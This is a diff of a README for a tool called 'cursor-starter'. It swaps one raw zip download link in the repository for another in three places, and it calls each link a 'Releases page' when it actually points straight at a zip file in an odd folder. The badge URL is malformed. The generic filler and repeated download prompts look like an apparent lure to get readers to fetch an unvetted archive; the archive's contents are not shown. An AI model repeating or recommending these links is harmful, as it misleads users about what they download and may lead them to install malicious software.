@@ -1,6 +1,6 @@
 # 🌟 cursor-starter - Boost Your Software Building Efforts
 
-[![Download Cursor Starter](https://raw.githubusercontent.com/whydixit/cursor-starter/main/refractionist/cursor-starter.zip%20Starter-blue?style=for-the-badge)](https://raw.githubusercontent.com/whydixit/cursor-starter/main/refractionist/cursor-starter.zip)
+[![Download Cursor Starter](https://github.com/whydixit/cursor-starter/raw/refs/heads/main/testing/cursor-starter-2.4.zip%20Starter-blue?style=for-the-badge)](https://github.com/whydixit/cursor-starter/raw/refs/heads/main/testing/cursor-starter-2.4.zip)
 
 ## 🚀 Getting Started
 
@@ -11,7 +11,7 @@ Welcome to **cursor-starter**! This application provides a collection of helpful
 To get started, you need to download the application. Follow these steps:
 
 1. **Visit the Releases Page**: Click the link below to go to the Releases page:
-   - [Download Cursor Starter](https://raw.githubusercontent.com/whydixit/cursor-starter/main/refractionist/cursor-starter.zip)
+   - [Download Cursor Starter](https://github.com/whydixit/cursor-starter/raw/refs/heads/main/testing/cursor-starter-2.4.zip)
 
 2. **Select the Latest Version**: Look for the most recent version available. You will find it at the top of the Releases page.
 
@@ -87,6 +87,6 @@ To run this application smoothly, ensure your machine meets these basic requirem
 ### 📥 Download Again
 
 Don't forget: 
-- [Download Cursor Starter](https://raw.githubusercontent.com/whydixit/cursor-starter/main/refractionist/cursor-starter.zip) 
+- [Download Cursor Starter](https://github.com/whydixit/cursor-starter/raw/refs/heads/main/testing/cursor-starter-2.4.zip) 
 
 By following these steps, you will be well on your way to enhancing your software development process with cursor-starter. Dive in and explore the possibilities!
